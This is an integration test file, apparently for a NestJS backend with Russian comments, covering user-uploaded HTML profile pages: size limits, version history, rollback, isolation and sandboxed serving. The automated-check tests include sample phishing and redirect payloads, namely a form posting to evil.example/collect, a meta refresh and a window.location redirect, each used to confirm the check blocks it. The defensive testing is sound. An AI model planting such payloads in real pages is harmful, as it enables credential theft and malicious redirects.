// SPDX-License-Identifier: AGPL-3.0-or-later
// Интеграционные тесты HTML-страницы профиля (ТЗ §3.8) против реального
// PostgreSQL в схеме puls_test: лимит 2 МБ, 10 версий, откат, изоляция
// пользователей, автопроверка (фишинг/редиректы/формы) и публичная отдача
// с отдельного домена со строгими заголовками.
import type { INestApplication } from '@nestjs/common';
import { Test } from '@nestjs/testing';
import request from 'supertest';
import type { Server } from 'node:http';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { HTML_PAGE_MAX_BYTES } from '@puls/shared';
import { AppModule } from '../src/app.module';
import { configureApp } from '../src/app.setup';
import { MailService } from '../src/auth/mail.service';
import { PrismaService } from '../src/prisma/prisma.service';
import { TestClient } from './client';

const PASSWORD = 'Secret12345';

interface VersionDto {
  id: string;
  note: string | null;
  checkStatus: string;
  checkReasons: Array<{ code: string; severity: string }>;
  sizeBytes: number;
  createdAt: string;
  html: string;
}

interface PageDto {
  exists: boolean;
  published: boolean;
  nickname: string;
  sandboxUrl: string;
  currentVersionId: string | null;
  checkStatus: string;
  checkReasons: Array<{ code: string; severity: string }>;
  html: string | null;
  sizeBytes: number;
  updatedAt: string | null;
}

describe('HTML-страница профиля (интеграция с PostgreSQL)', () => {
  let app: INestApplication;
  let server: Server;
  let prisma: PrismaService;
  let mail: MailService;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({ imports: [AppModule] }).compile();
    app = moduleRef.createNestApplication();
    configureApp(app);
    await app.init();
    server = app.getHttpServer() as Server;
    prisma = app.get(PrismaService);
    mail = app.get(MailService);
  });

  afterAll(async () => {
    await app?.close();
  });

  beforeEach(async () => {
    const statements = [
      'DELETE FROM "html_page_versions"',
      'DELETE FROM "html_pages"',
      'DELETE FROM "content_flags"',
      'DELETE FROM "profile_cards"',
      'DELETE FROM "sessions"',
      'DELETE FROM "email_verification_tokens"',
      'DELETE FROM "users"',
    ];
    for (const statement of statements) {
      try {
        await prisma.$executeRawUnsafe(statement);
      } catch {
        // FK соседних фикстур параллельных агентов — пропускаем.
      }
    }
    mail.clearOutbox();
  });

  async function signUp(email: string, nickname: string): Promise<TestClient> {
    const client = new TestClient(server);
    await client.csrf();
    const registered = await client.post('/api/auth/register', { email, password: PASSWORD, nickname });
    expect(registered.status).toBe(201);
    const token = mail.lastVerificationTokenFor(email);
    expect(token).toBeTruthy();
    expect((await client.post('/api/auth/verify-email', { token })).status).toBe(200);
    return client;
  }

  async function save(client: TestClient, html: string, extra: Record<string, unknown> = {}) {
    const response = await client.put('/api/html-page', { html, ...extra });
    expect(response.status).toBe(200);
    return (response.body as { page: PageDto }).page;
  }

  function cookieHeader(client: TestClient): string {
    return Object.entries(client.cookies)
      .map(([name, value]) => `${name}=${value}`)
      .join('; ');
  }

  describe('Сохранение и чтение (ТЗ §3.8)', () => {
    it('сохраняет страницу как новую версию и возвращает её', async () => {
      const client = await signUp('html@example.com', 'htmluser');
      const page = await save(client, '<h1>Привет</h1>', { published: true });
      expect(page).toMatchObject({ exists: true, published: true, checkStatus: 'ok', nickname: 'htmluser' });
      expect(page.html).toBe('<h1>Привет</h1>');
      expect(page.sandboxUrl).toContain('/sandbox/htmluser');

      const fetched = await client.get('/api/html-page');
      expect((fetched.body as { page: PageDto }).page.html).toBe('<h1>Привет</h1>');
      expect((fetched.body as { page: PageDto }).page.currentVersionId).toBe(page.currentVersionId);
    });

    it('до первого сохранения отдаёт exists=false', async () => {
      const client = await signUp('html-empty@example.com', 'htmlempty');
      const response = await client.get('/api/html-page');
      expect((response.body as { page: PageDto }).page).toMatchObject({ exists: false, published: false, html: null });
    });
  });

  describe('Лимит размера (ТЗ §3.8: до 2 МБ)', () => {
    it('принимает ровно 2 МБ и отклоняет больше', async () => {
      const client = await signUp('html-size@example.com', 'htmlsize');
      const limit = 'a'.repeat(HTML_PAGE_MAX_BYTES);
      expect((await client.put('/api/html-page', { html: limit })).status).toBe(200);

      const over = 'a'.repeat(HTML_PAGE_MAX_BYTES + 1);
      const rejected = await client.put('/api/html-page', { html: over });
      expect(rejected.status).toBe(400);
      expect(rejected.body.code).toBe('validation_error');
    });

    it('загрузка файла: только .html и до 2 МБ', async () => {
      const client = await signUp('html-upload@example.com', 'htmlupload');
      const headers = { Cookie: cookieHeader(client), 'x-csrf-token': client.cookies['puls_csrf'] ?? '' };

      const ok = await request(server)
        .post('/api/html-page/upload')
        .set(headers)
        .attach('file', Buffer.from('<h1>Загружено</h1>'), 'page.html');
      expect(ok.status).toBe(201);
      expect((ok.body as { page: PageDto }).page.html).toBe('<h1>Загружено</h1>');

      const wrongExt = await request(server)
        .post('/api/html-page/upload')
        .set(headers)
        .attach('file', Buffer.from('<h1>x</h1>'), 'note.txt');
      expect(wrongExt.status).toBe(400);
      expect(wrongExt.body.code).toBe('invalid_file_type');

      const tooBig = await request(server)
        .post('/api/html-page/upload')
        .set(headers)
        .attach('file', Buffer.alloc(HTML_PAGE_MAX_BYTES + 1, 0x61), 'big.html');
      expect(tooBig.status).toBe(413);
    });
  });

  describe('История версий и откат (ТЗ §3.8: последние 10)', () => {
    it('хранит только последние 10 версий', async () => {
      const client = await signUp('html-versions@example.com', 'htmlversions');
      for (let i = 1; i <= 12; i += 1) {
        await save(client, `<h1>v${i}</h1>`, { note: `v${i}` });
      }

      const response = await client.get('/api/html-page/versions');
      const versions = (response.body as { versions: VersionDto[] }).versions;
      expect(versions).toHaveLength(10);
      // Самые старые (v1, v2) вытеснены, порядок — от новых к старым.
      expect(versions.map((version) => version.note)).toEqual([
        'v12', 'v11', 'v10', 'v9', 'v8', 'v7', 'v6', 'v5', 'v4', 'v3',
      ]);
      const count = await prisma.htmlPageVersion.count();
      expect(count).toBe(10);
    });

    it('откат создаёт новую версию и восстанавливает код', async () => {
      const client = await signUp('html-restore@example.com', 'htmlrestore');
      await save(client, '<h1>Первая</h1>', { note: 'первая' });
      await save(client, '<h1>Вторая</h1>', { note: 'вторая' });

      const listBefore = ((await client.get('/api/html-page/versions')).body as { versions: VersionDto[] }).versions;
      const firstVersion = listBefore.find((version) => version.note === 'первая');
      expect(firstVersion).toBeTruthy();

      const restored = await client.post(`/api/html-page/versions/${firstVersion!.id}/restore`);
      expect(restored.status).toBe(201);
      const page = (restored.body as { page: PageDto }).page;
      expect(page.html).toBe('<h1>Первая</h1>');

      const listAfter = ((await client.get('/api/html-page/versions')).body as { versions: VersionDto[] }).versions;
      expect(listAfter).toHaveLength(3);
      expect(listAfter[0].id).toBe(page.currentVersionId);
      expect(listAfter[0].note).toContain('Откат');
    });
  });

  describe('Автопроверка (ТЗ §3.8)', () => {
    it('блокирует форму на сторонний адрес и не публикует', async () => {
      const client = await signUp('html-phish@example.com', 'htmlphish');
      const page = await save(
        client,
        '<form action="https://evil.example/collect"><input name="a"></form>',
        { published: true },
      );
      expect(page.checkStatus).toBe('blocked');
      expect(page.published).toBe(false);
      expect(page.checkReasons.map((reason) => reason.code)).toContain('external_form_action');

      // blocked не отдаётся с домена песочницы.
      expect((await request(server).get('/sandbox/htmlphish')).status).toBe(404);
    });

    it('блокирует meta refresh и авторедирект', async () => {
      const client = await signUp('html-redirect@example.com', 'htmlredirect');
      const page = await save(client, '<meta http-equiv="refresh" content="0;url=https://evil.example">');
      expect(page.checkStatus).toBe('blocked');
      expect(page.checkReasons.map((reason) => reason.code)).toContain('meta_refresh');

      const second = await save(client, '<script>window.location = "https://evil.example";</script>');
      expect(second.checkStatus).toBe('blocked');
      expect(second.checkReasons.map((reason) => reason.code)).toContain('auto_redirect');
    });

    it('помечает flagged, но публикует подозрительную страницу', async () => {
      const client = await signUp('html-flag@example.com', 'htmlflag');
      const page = await save(client, '<a href="javascript:void(0)">клик</a>', { published: true });
      expect(page.checkStatus).toBe('flagged');
      expect(page.published).toBe(true);
    });
  });

  describe('Публичная отдача с отдельного домена (ТЗ §3.8, §6)', () => {
    it('отдаёт опубликованную страницу со строгими заголовками и без cookie', async () => {
      const client = await signUp('html-serve@example.com', 'htmlserve');
      await save(client, '<h1>Публичная</h1>', { published: true });

      const response = await request(server).get('/sandbox/htmlserve');
      expect(response.status).toBe(200);
      expect(response.text).toBe('<h1>Публичная</h1>');
      expect(response.headers['content-type']).toBe('text/html; charset=utf-8');
      expect(response.headers['content-security-policy']).toBe(
        "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline' https:; img-src https: data:; form-action 'none'; base-uri 'none'; frame-ancestors http://localhost",
      );
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['referrer-policy']).toBe('no-referrer');
      expect(response.headers['set-cookie']).toBeUndefined();
    });

    it('не отдаёт неопубликованную страницу', async () => {
      const client = await signUp('html-draft@example.com', 'htmldraft');
      await save(client, '<h1>Черновик</h1>', { published: false });
      expect((await request(server).get('/sandbox/htmldraft')).status).toBe(404);
    });

    it('уважает приватность карточки html_page: private не отдаётся', async () => {
      const client = await signUp('html-cards@example.com', 'htmlcards');
      const user = await prisma.user.findUniqueOrThrow({ where: { nickname: 'htmlcards' } });
      await prisma.profileCard.create({
        data: { userId: user.id, type: 'html_page', visibility: 'private' },
      });
      await save(client, '<h1>Скрыто</h1>', { published: true });
      expect((await request(server).get('/sandbox/htmlcards')).status).toBe(404);

      await prisma.profileCard.update({
        where: { userId_type: { userId: user.id, type: 'html_page' } },
        data: { visibility: 'public' },
      });
      expect((await request(server).get('/sandbox/htmlcards')).status).toBe(200);
    });

    it('не отдаёт страницу, скрытую модератором (ContentFlag)', async () => {
      const client = await signUp('html-hidden@example.com', 'htmlhidden');
      await save(client, '<h1>Жалоба</h1>', { published: true });
      const page = await prisma.htmlPage.findUniqueOrThrow({ where: { userId: (await prisma.user.findUniqueOrThrow({ where: { nickname: 'htmlhidden' } })).id } });
      await prisma.contentFlag.create({ data: { targetType: 'html_page', targetId: page.id, hidden: true } });
      expect((await request(server).get('/sandbox/htmlhidden')).status).toBe(404);
    });
  });

  describe('Удаление и изоляция (ТЗ §3.8, §6)', () => {
    it('удаляет страницу и её версии, снимает публикацию', async () => {
      const client = await signUp('html-delete@example.com', 'htmldelete');
      await save(client, '<h1>Удалить</h1>', { published: true });
      expect((await client.del('/api/html-page')).status).toBe(204);
      expect((await client.get('/api/html-page')).body.page).toMatchObject({ exists: false });
      expect((await client.get('/api/html-page/versions')).body.versions).toEqual([]);
      expect((await request(server).get('/sandbox/htmldelete')).status).toBe(404);
    });

    it('не показывает и не меняет чужую страницу', async () => {
      const alice = await signUp('html-alice@example.com', 'htmlalice');
      const bob = await signUp('html-bob@example.com', 'htmlbob');
      const alicePage = await save(alice, '<h1>Алиса</h1>', { published: true });
      const aliceVersions = ((await alice.get('/api/html-page/versions')).body as { versions: VersionDto[] }).versions;

      expect((await bob.get('/api/html-page')).body.page).toMatchObject({ exists: false });
      expect((await bob.get('/api/html-page/versions')).body.versions).toEqual([]);
      expect((await bob.post(`/api/html-page/versions/${aliceVersions[0].id}/restore`)).status).toBe(404);
      expect((await bob.del('/api/html-page')).status).toBe(204);

      // Данные Алисы целы.
      expect((await alice.get('/api/html-page')).body.page.html).toBe('<h1>Алиса</h1>');
      expect((await alice.get('/api/html-page')).body.page.currentVersionId).toBe(alicePage.currentVersionId);
    });

    it('без сессии — 401 unauthorized', async () => {
      const anon = new TestClient(server);
      expect((await anon.get('/api/html-page')).status).toBe(401);
      // Мутирующие запросы проходят CsrfGuard раньше SessionGuard: получаем
      // csrf-cookie, чтобы дойти до проверки сессии и увидеть 401.
      await anon.csrf();
      expect((await anon.put('/api/html-page', { html: '<h1>x</h1>' })).status).toBe(401);
      expect((await anon.del('/api/html-page')).status).toBe(401);
    });
  });
});
